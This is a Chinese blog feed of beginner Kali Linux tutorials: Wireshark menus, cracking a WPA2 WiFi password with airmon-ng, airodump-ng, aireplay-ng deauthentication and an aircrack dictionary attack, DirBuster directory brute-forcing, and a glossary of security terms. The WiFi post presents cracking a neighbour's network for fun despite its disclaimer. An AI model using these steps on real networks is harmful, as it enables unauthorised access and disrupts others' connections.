<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538733784206.png" data-fancybox="group" data-caption="1538733784206" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538733784206.png" alt="1538733784206" title="1538733784206"></a></p>
<p>这里我们来介绍一下上面这些内容的信息。</p>
<p>我们打开终端，Ping一下一个地址，这样就会给我们出现一些icmp的包。我们尝试着抓一下分析一下。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538733603852.png" data-fancybox="group" data-caption="1538733603852" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538733603852.png" alt="1538733603852" title="1538733603852"></a></p>
<p>我们ping一下百度。</p>
<p>然后在过滤器里面输入icmp以此来过滤icmp的包。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538823210511.png" data-fancybox="group" data-caption="1538823210511" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538823210511.png" alt="1538823210511" title="1538823210511"></a></p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538823427369.png" data-fancybox="group" data-caption="1538823427369" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538823427369.png" alt="1538823427369" title="1538823427369"></a></p>
<p>当我们需要对所抓到数据进行存储的时候，我们可以用ctrl+m标记数据包，并且在下次我们可以打开。</p>
<p>上面只是简单的介绍一下怎么用，这里我们还是来逐个的分析这些功能怎么用，由于本文只做于入门，所以可能讲的不是那么深。</p>
<h3 id="文件栏"><a href="#文件栏" class="headerlink" title="文件栏"></a>文件栏</h3><p>我们首先看文件这一栏。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538824674921.png" data-fancybox="group" data-caption="1538824674921" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538824674921.png" alt="1538824674921" title="1538824674921"></a></p>
<p>我们打开之后发现有这些选项。</p>
<p>[<a href="http://man.lupaworld.com/content/network/wireshark/wsug_graphics/Note.png" data-fancybox="group" data-caption="[]" class="fancybox"><img src="http://man.lupaworld.com/content/network/wireshark/wsug_graphics/Note.png" alt="[]" title="[]"></a>](<a href="http://man.lupaworld.com/content/network/wireshark/c5.2.html#c5.2.1" target="_blank" rel="noopener">http://man.lupaworld.com/content/network/wireshark/c5.2.html#c5.2.1</a>)</p>
<p>这个实在官方文档找到的一些，感觉说的还是蛮详细的，作为文件的一些操作这里我们就不做详细解释啦。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538825634107.png" data-fancybox="group" data-caption="1538825634107" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538825634107.png" alt="1538825634107" title="1538825634107"></a></p>
<p>我们继续往下看编辑这一组里面。</p>
<h3 id="编辑栏"><a href="#编辑栏" class="headerlink" title="编辑栏"></a>编辑栏</h3><p>这里我们来介绍一些有特点的东西。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538826241803.png" data-fancybox="group" data-caption="1538826241803" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538826241803.png" alt="1538826241803" title="1538826241803"></a></p>
<p>我们来说一下标记包，标记包可以在我们进行分组分析的时候更加直观，被标记的包会变成黑色背景，我们也可以对被标记的包进行导出。</p>
<p>其次我们再来说一下包参考时间。</p>
<p>这个包参考时间是基于当前包收到的时间等等计算的，这个可以帮助我们对网络状况进行分析。</p>
<p>另外这个是不能保存在文件当中的，当我们再次打开包的时候他就会消失。</p>
<h3 id="视图栏"><a href="#视图栏" class="headerlink" title="视图栏"></a>视图栏</h3><p>视图这个东西大家从字面意思就能够知道个差不多，这里我们要说明一下视图里面的功能，这个很想word这种办公软件里面一样可以调出我们的一些工具栏。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538905719451.png" data-fancybox="group" data-caption="1538905719451" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538905719451.png" alt="1538905719451" title="1538905719451"></a></p>
<p>首先我们来说主工具栏，</p>
<p>这个就是我们wireshark最上边那一行。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538905831107.png" data-fancybox="group" data-caption="1538905831107" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538905831107.png" alt="1538905831107" title="1538905831107"></a></p>
<p>这里面我们可以选择接口，就是监听的网卡啥的，还有啥时候开始啥时候结束。</p>
<p>这里面我们简单的说一下。因为没什么复杂的，我们就不实操了。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538905902197.png" data-fancybox="group" data-caption="1538905902197" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538905902197.png" alt="1538905902197" title="1538905902197"></a></p>
<p>我们接下来再来说我们会经常用到的过滤工具栏，这里面我们可以对所捕获的数据包进行过滤，这里我们来说一下它的语法。（认真听哦，这个还是蛮重要的）</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538906002237.png" data-fancybox="group" data-caption="1538906002237" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538906002237.png" alt="1538906002237" title="1538906002237"></a></p>
<p>我们点击表达式，这里面会帮助我们生成一系列语法，当然我们是新手就需要这个的帮助啦。在我们熟悉之后我们可以自己直接写就OK了。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538906269085.png" data-fancybox="group" data-caption="1538906269085" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538906269085.png" alt="1538906269085" title="1538906269085"></a></p>
<p>在这里面我们注意，左边这里是显示的协议右边哪里我们可以定义一系列规则。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538906470710.png" data-fancybox="group" data-caption="1538906470710" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538906470710.png" alt="1538906470710" title="1538906470710"></a></p>
<p>比如说这里面，我们直接就选择ICMP我们就像看ICMP的包，对于右边我们看到is present这个是一元关系，当我们需要满足其他条件的时候我们就可以选择下面的==，&gt;=等关系符号进行制造表达式，直到表达式为真。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538906894832.png" data-fancybox="group" data-caption="1538906894832" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538906894832.png" alt="1538906894832" title="1538906894832"></a></p>
<p>这个我们就来个最基本的，这样我们就可以查看icmp的包，由于这里面规则太多了，本文限于篇幅就不一一赘述了。</p>
<p>我们可以再<a href="https://wiki.wireshark.org/DisplayFilters" target="_blank" rel="noopener">这里</a>了解更多</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538906929993.png" data-fancybox="group" data-caption="1538906929993" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538906929993.png" alt="1538906929993" title="1538906929993"></a></p>
<p>无线工具栏我们打开就会这样叫我们选择信道还有借口进行分析。</p>
<p>像什么状态栏，着色分组啥的这些都是帮助我们更加直观的看包的信息的。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538907061984.png" data-fancybox="group" data-caption="1538907061984" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538907061984.png" alt="1538907061984" title="1538907061984"></a></p>
<p>我们再看看跳转这一栏，这个就不用多说了吧。大家应该都知道，下一项！</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538907127568.png" data-fancybox="group" data-caption="1538907127568" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538907127568.png" alt="1538907127568" title="1538907127568"></a></p>
<p>对于捕获这里，我们在一开始也都说了，我们科在这里开始停止，丢弃重新抓，还有就是选择过滤器。</p>
<p>这次这篇就先到这里了，我们需要慢慢消化一下，另外本篇我打算分上中下三篇来说，第一篇就是这个啦，我们简单的抓个包看看怎么用，之后介绍一部分菜单选项，第二篇继续介绍简单选项，然后深入一些。第三篇抓包分析。由于国庆节也过了个乱七八糟，所以可能有点乱，大家谅解哈！</p>
]]></content>
      <categories>
        <category>kali学习</category>
        <category>网络嗅探</category>
      </categories>
      <tags>
        <tag>网络嗅探</tag>
        <tag>工具</tag>
        <tag>wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title>kali 工具入门-2 Aircrack爆破wifi密码</title>
    <url>/2018/12/17/kali-e5-b7-a5-e5-85-b7-e5-85-a5-e9-97-a8-2-aircrack-e7-88-86-e7-a0-b4wifi-e5-af-86-e7-a0-81/</url>
    <content><![CDATA[<p>kali 工具入门-2 Aircrack爆破wifi密码</p>
<h2 id="kali-工具入门-2-Aircrack爆破wifi密码"><a href="#kali-工具入门-2-Aircrack爆破wifi密码" class="headerlink" title="kali 工具入门-2 Aircrack爆破wifi密码"></a>kali 工具入门-2 Aircrack爆破wifi密码</h2><h2 id="警告"><a href="#警告" class="headerlink" title="警告"></a>警告</h2><p> 在现实中破解别人的WIFI密码属于违法行为，我们这里已经获得被破解方的授权，本文章只用于交流技术，了解原理以便我们更好的防御，不做任何攻击用途，利用本文方法所造成的后果，一切由攻击者个人承担，与作者无关。请大家遵守网络安全法。</p>
<h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p> 上节课我们学习了dirbuster的使用，不过这个工具好像还是一般般吧，话说昨天没控制好线程，把实验室的一台服务器搞崩了。今天，在实验室待着，突然想休息休息看个小电影，无奈wifi没有，只能想办法拿隔壁教室wifi密码了。（PS：隔壁实验室被本人扫崩过一次，不敢去了）哈哈，正好多学点东西吗，开始搞事！</p>
<p> –青花</p>
<h2 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h2><p> 这里我考虑到大家一般都是用虚拟机的，这个我就要说明一下了，这个我们需要用一个无限的外置网卡，这里面我们的内置网卡是不能用的，除非你的笔记本电脑是物理机的KALI系统，不然你就得买一个KALI能够识别的网卡。我这里用的是RTL8187，这个淘宝上很便宜就能买到。</p>
<p>首先我们看看我们的网络配置</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538051317560.png" data-fancybox="group" data-caption="1538051317560" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538051317560.png" alt="1538051317560" title="1538051317560"></a></p>
<p>我们发现我们的网卡已经被成功加载了。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538051266338.png" data-fancybox="group" data-caption="1538051266338" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538051266338.png" alt="1538051266338" title="1538051266338"></a></p>
<p>我们看一下支持开启监听模式的网卡，输入</p>
<p>airmon-ng。</p>
<p>之后我们发现可以用来监听，那么下一步就是我们开启监听模式啦！</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538051615500.png" data-fancybox="group" data-caption="1538051615500" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538051615500.png" alt="1538051615500" title="1538051615500"></a></p>
<p>输入airmon-ng start wlan0 #后面的那个wlan0就是你网卡的名字。是啥写啥。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538051731901.png" data-fancybox="group" data-caption="1538051731901" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538051731901.png" alt="1538051731901" title="1538051731901"></a></p>
<p>当我们执行成功之后网卡会变为wlan0mon</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538051792808.png" data-fancybox="group" data-caption="1538051792808" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538051792808.png" alt="1538051792808" title="1538051792808"></a></p>
<p>之后输入airodump-ng wlan0mon</p>
<p>这样就会查看附近的wifi开启状况。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538051834019.png" data-fancybox="group" data-caption="1538051834019" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538051834019.png" alt="1538051834019" title="1538051834019"></a></p>
<p>这里面给我们列出了一系列的数据我们从左到右看</p>
<p>先说上面</p>
<p>BSSID 这个我们一看就知道啦，MAC地址对吧。</p>
<p>PWR 这个是说信号强度，越小越好！</p>
<p>DATA 这个是捕获到的数据包的数量</p>
<p>CH WIFI的信道，这个我们得记下来</p>
<p>ENC 采用的加密算法，从前WEP可以碰出来的，现在一般都是WPA2了。</p>
<p>ESSID WIFI的名字</p>
<p>下面的那些是我们抓到WIFI中客户端发的包的信息，比如说我在这个WIFI中，我在用，就可能被监听到。</p>
<p>STATION 这个是客户端的MAC地址</p>
<p>我们需要记住BSSID还有CH这个信道，我们要开始抓握手包了。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538052446412.png" data-fancybox="group" data-caption="1538052446412" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538052446412.png" alt="1538052446412" title="1538052446412"></a></p>
<p>这里我们开始进行监听抓包</p>
<p>–BSSID指定MAC地址</p>
<p>-C 指定频道</p>
<p>-W 指定文件</p>
<p>后面接我们的网卡名字。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538052512399.png" data-fancybox="group" data-caption="1538052512399" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538052512399.png" alt="1538052512399" title="1538052512399"></a></p>
<p>这里我们等待抓包，抓到用户与WIFI建立连接的握手包，然后拉回来爆破，就是这个基本原理，但是有人肯定会说，那我得等到啥时候啊，别着急我们还有骚操作。</p>
<p>这里有一款工具，就是能够强制中断用户与WIFI的连接，迫使用户与WIFI重新建立连接。这个工具会给客户端发一个伪造的包，迫使其与WIFI断开连接，然后进行重新连接。</p>
<p>这款工具叫</p>
<p>aireplay</p>
<p>aireplay-ng -0 1 后面的数字1表示攻击的次数，这个不要恶作剧啊，叫人家一直断网。</p>
<p>-a WIFI的Mac地址</p>
<p>-c 客户端的Mac地址</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538053256986.png" data-fancybox="group" data-caption="1538053256986" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538053256986.png" alt="1538053256986" title="1538053256986"></a></p>
<p>这个效果一开始不好，一直抓不到握手包，没法给他日100包。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538053303089.png" data-fancybox="group" data-caption="1538053303089" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538053303089.png" alt="1538053303089" title="1538053303089"></a></p>
<p>终于抓到了。（那哥们终于发觉断网了！）</p>
<p>接下来就是破解我们抓到的包了。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538053725462.png" data-fancybox="group" data-caption="1538053725462" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538053725462.png" alt="1538053725462" title="1538053725462"></a></p>
<p>之后我们输入命令，这里面</p>
<p>-a2是指定我们的加密解密方式 wp2</p>
<p>-w 前面一个文件是指定我们的字典，后面的是指定我们抓到的握手包文件</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538053787124.png" data-fancybox="group" data-caption="1538053787124" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538053787124.png" alt="1538053787124" title="1538053787124"></a></p>
<p>我XXX ，这密码唉~</p>
<p>这样我们发现密码爆破出来了。好了连上WIFI继续HAPPY吧！</p>
<p>这个还是用字典爆破，成功与否在于你的字典强度，另外就是WIFI主人的安全意识。</p>
<p>是不是很好玩呢，会去也自己试验一下玩玩吧，注意哦，不要攻击别人哦，我们要做一个遵纪守法的好公民，切记，本本仅用于技术交流学习，不得用于任何非法用途，否则又使用者个人承担。</p>
]]></content>
      <categories>
        <category>kali学习</category>
        <category>安全之路</category>
      </categories>
      <tags>
        <tag>无线安全</tag>
        <tag>wifi破解</tag>
      </tags>
  </entry>
  <entry>
    <title>kali工具入门-1DirBuster</title>
    <url>/2018/12/17/kali-e5-b7-a5-e5-85-b7-e5-85-a5-e9-97-a8-1dirbuster/</url>
    <content><![CDATA[<p>kali工具入门-1DirBuster</p>
<h2 id="写在前面的BB话"><a href="#写在前面的BB话" class="headerlink" title="写在前面的BB话"></a>写在前面的BB话</h2><p> 学习是永无止境的，对于入门web安全不久的我这个菜鸡来说，当然也不能停了，加入了异空间安全团队以来自己的学习习惯好了不少，以时间为单位的话，每周都要学有所成，所以我打算花一些时间学习消化一个kali上面的工具，当然限于个人天赋有的工具可能分上下篇说，甚至更多，当然如果时间多的话，可能会短时间消化好几个，具体试情况而定。好了，废话不多说，就此开始吧。</p>
<p> –青花，写于2018/9/21</p>
<h2 id="发生在前面的故事"><a href="#发生在前面的故事" class="headerlink" title="发生在前面的故事"></a>发生在前面的故事</h2><p> 最近在挖掘信息泄露的漏洞，由于常常要用到目录扫描工具，还有一些爬虫，搞到一些别人看不到的地方。还有，有的时候你找到了一个注入点，注了半天用户表什么的都注出来了，管理账号密码都知道了，却发现了找不到后台，这是你心里肯定觉得日了个狗（PS：其实在搞这个之前明白的人应该先找后台的，看看有没有CMS）。用御剑扫了扫，发现效果不是很理想（PS：可能是自己字典不够强大），突然想到kali上面有几款目录扫描的工具，所以来玩一下。</p>
<h2 id="工具一般原理"><a href="#工具一般原理" class="headerlink" title="工具一般原理"></a>工具一般原理</h2><p>好多网络工具的本质就是爬虫，这个我们可以思考一下，我们通过构造一些url</p>
<p>一般来说我们比如说访问一个网站</p>
<p><a href="http://www.demo.com" target="_blank" rel="noopener">http://www.demo.com</a></p>
<p>假设说这个url是一个基于tomcat的网站，那么他默认应该是在webapp这个文件夹里面，我们就可以通过构造url来探测是否存在该漏洞。</p>
<p>比如我们探测docs这个目录</p>
<p><a href="http://www.demo.com/docs" target="_blank" rel="noopener">http://www.demo.com/docs</a></p>
<p>这样我们就通过访问该状态url通过判断http消息头的状态码，来判定是否存在该页面，一般来说会返回200.也就是我们常说的ok.如果找不到就会出现404的错误，如果访问身份不对的话就会出现403等。</p>
<p>那么这个方法准确吗，我告诉大家未必。</p>
<p>我们思考一下，如果我做一个页面专门供找不到该文件时就会访问这个文件，那么这个时候页面状态便是200。所以说这个方法不一定准确。</p>
<p>当然以上基本原理我们可以参考一下，在我们定制自己的工具的时候，我们可以根据自己的思路加入更加骚的方法来定制我们的目录爆破工具。</p>
<h2 id="DirBuster"><a href="#DirBuster" class="headerlink" title="DirBuster"></a>DirBuster</h2><p> 简介一下，DirBuster这款工具使用Java写的一款专门用来探测web服务器隐藏目录以及文件的一款工具。由Owasp开发。另外在网上找了找发现居然没有详细讲这个工具用法的文章，本文将在这些大佬的基础上拓展一些，由于个人技术原因比较菜，所以不足之处还请多多包含指导。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537525750486.png" data-fancybox="group" data-caption class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537525750486.png" alt title></a></p>
<p>我们可以直接在终端输入dirbuster来开启。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537525818565.png" data-fancybox="group" data-caption="1537525818565" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537525818565.png" alt="1537525818565" title="1537525818565"></a></p>
<p>之后就会出现这个页面，好啦，我们来说一下怎么用吧。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537525961773.png" data-fancybox="group" data-caption="1537525961773" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537525961773.png" alt="1537525961773" title="1537525961773"></a></p>
<p>在玩一个工具之前肯定第一要配置了，我们点开Options-&gt;Advanced Options</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537526008858.png" data-fancybox="group" data-caption="1537526008858" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537526008858.png" alt="1537526008858" title="1537526008858"></a></p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537527172016.png" data-fancybox="group" data-caption="1537527172016" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537527172016.png" alt="1537527172016" title="1537527172016"></a></p>
<p>这里我说明了一些用法。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537527361871.png" data-fancybox="group" data-caption="1537527361871" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537527361871.png" alt="1537527361871" title="1537527361871"></a></p>
<p>这里我们可以</p>
<p>设定身份认证等信息，这里面说的很清楚用户名，密码，域</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537527780113.png" data-fancybox="group" data-caption="1537527780113" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537527780113.png" alt="1537527780113" title="1537527780113"></a></p>
<p>这里设定http协议的一些信息。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537527996959.png" data-fancybox="group" data-caption="1537527996959" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537527996959.png" alt="1537527996959" title="1537527996959"></a></p>
<p>这里设定访问判定连接超时的时间，还要返回的内容等，下面可以设定失败后在此访问时间。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537528065834.png" data-fancybox="group" data-caption="1537528065834" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537528065834.png" alt="1537528065834" title="1537528065834"></a></p>
<p>这里我们可以设定一些线程的信息。</p>
<p>以上是一些基本的配置信息，这里面我们来说一下如何使用了。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537528368899.png" data-fancybox="group" data-caption="1537528368899" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537528368899.png" alt="1537528368899" title="1537528368899"></a></p>
<p>这里我们回到主页面。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537528955311.png" data-fancybox="group" data-caption="1537529546051" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537528955311.png" alt="1537529546051" title="1537529546051"></a></p>
<p>这里漏了一项就是work method</p>
<p>这个选择我们使用http请求的方法，一个是get，还有一个是head方式。head方式请求包会小好多。我们这里默认选定自动切换。</p>
<p>这里我们介绍了上面几项的用法，这里我们说一下在选择模式中我们所说的一种是字典爆破，还有一种是通过蛮力破解。</p>
<p>这叫我想起了我去年在某论坛上看到的一个问题，</p>
<p>这个问题是请问暴力破解跟枚举跑字典有什么区别？</p>
<p>当时我的回答是这样的，其实暴力破解就是枚举的一种。也就是说两者一样。现在想想我的回答是错误的。往往我们通常所说的暴力破解是在有一些信息的基础上，比如我们根据我们信息搜集出来的信息爆破一些弱密码，但是一般我们来说枚举就是从1，2，3，a,b,c这些一个一个的试，这个相对于我们来说的暴力破解看着是一样的，其实在日常我们干的时候叫法可能导致了一些误会。</p>
<p>这里我们应该大概知道蛮力破解大致的意思了吧。</p>
<p>我们看到我们切换到蛮力破解，前面叫我们选择字符范围，后面叫我们选择长度。</p>
<p>我们继续向下进行。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537529611460.png" data-fancybox="group" data-caption="1537529611460" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537529611460.png" alt="1537529611460" title="1537529611460"></a></p>
<p>我们可以在这里选择字典信息。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537531106475.png" data-fancybox="group" data-caption="1537531106475" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537531106475.png" alt="1537531106475" title="1537531106475"></a></p>
<p>这个我们可以在本工具的目录找到工具自带的一些字典。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537530536218.png" data-fancybox="group" data-caption class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537530536218.png" alt title></a></p>
<p>这里我们继续向下说，这里我们选定两个选项，这里说的很明白搜索选项。我们这里选择了url模糊测试</p>
<p>解释一下</p>
<p>就是这样</p>
<p>｛dir｝这个是一个变量，用于代表我们字典中的内容</p>
<p>假如说有这个url</p>
<p><a href="http://www..demo.com/webapp/{dir}" target="_blank" rel="noopener">http://www..demo.com/webapp/{dir}</a></p>
<p>这样就会列举内容拼接到这个url前面部分，假设说我们的字典第一项为1</p>
<p>就会构成以下Url</p>
<p><a href="http://www.demo.com/webapp/1" target="_blank" rel="noopener">http://www.demo.com/webapp/1</a></p>
<p>然后继续向下进行。</p>
<p>比如我们这样指定。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537530820345.png" data-fancybox="group" data-caption="1537530820345" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537530820345.png" alt="1537530820345" title="1537530820345"></a></p>
<p>当我们选择第一项，标准设定，这里面我们看到可以定义一些蛮力爆破的目录文件，上面我们设定一些目录的信息，下面我们可以选择文件的扩展名，或者选择空扩展名。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537531396488.png" data-fancybox="group" data-caption="1537531396488" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537531396488.png" alt="1537531396488" title="1537531396488"></a></p>
<p>之后我们设定好之后点击开始，start</p>
<p>这里我们扫描完成后就会获得一些信息，</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537531421255.png" data-fancybox="group" data-caption="1537531421255" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537531421255.png" alt="1537531421255" title="1537531421255"></a></p>
<p>这里会以目录树的形式显示给我们信息。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537531462247.png" data-fancybox="group" data-caption="1537531462247" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537531462247.png" alt="1537531462247" title="1537531462247"></a></p>
<p>这个是给我们显示扫描进度，这里时间较长，我就提前停止了。</p>
<p>下面的report用于生成报告等信息。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537531557151.png" data-fancybox="group" data-caption="1537531557151" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1537531557151.png" alt="1537531557151" title="1537531557151"></a></p>
<p>点击输出报告，可以选择形式。</p>
<p>好了今天这款工具我们就介绍到这里了。</p>
]]></content>
      <categories>
        <category>kali学习</category>
        <category>安全之路</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>目录爆破</tag>
      </tags>
  </entry>
  <entry>
    <title>WEB安全的一些名词解析</title>
    <url>/2018/12/17/web%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h2 id="写在前面的话"><a href="#写在前面的话" class="headerlink" title="写在前面的话"></a>写在前面的话</h2><p> 对于刚入行WEB安全的同学来说呢，我们可能遇到好多名词，什么后门，肉鸡，webshell，一句话，0day啥的，相信大家一开始接触肯定也是一脸懵逼，这里面呢，我们就来简单的介绍一下，这些名词是啥，大概的意思，叫大家有个了解。</p>
<p> –青花</p>
<h2 id="简单的介绍"><a href="#简单的介绍" class="headerlink" title="简单的介绍"></a>简单的介绍</h2><h3 id="EXP和POC"><a href="#EXP和POC" class="headerlink" title="EXP和POC"></a>EXP和POC</h3><p>所谓EXP就是指漏洞利用代码，这个往往是恶意代码，具备一定的攻击性。另外POC呢，POC就是证明漏洞存在的代码，这个往往是良性的，是无公害的。</p>
<h3 id="0day"><a href="#0day" class="headerlink" title="0day"></a>0day</h3><p>所谓0day就是说，被个人发现还未被公开的漏洞，或者是被人发现公开了但是厂商没有给出修复方案，这个就像秘密武器一样。</p>
<h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><p>后门在软件层次来说往往是软件开发者，为了方便自己进行调试啥的故意自己偷偷弄的一个捷径，在WEB安全方面，这个通常说是指，我们在服务器上弄得后门，可以十分容易的通过脚本程序啥的连接到服务器。</p>
<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>所谓webshell就是用诸如说asp,php等写成的类似于木马程序的后门等，可以查看数据库，执行一些命令等等，往往具有很高的权限。</p>
<h3 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h3><p>CVE 的英文全称是“Common Vulnerabilities &amp; Exposures”公共漏洞和暴露。通俗的来说就是公开漏洞的表示，后面跟编号，代表时间等信息啥的，比如说CVE-2017-8464（震网三代）。</p>
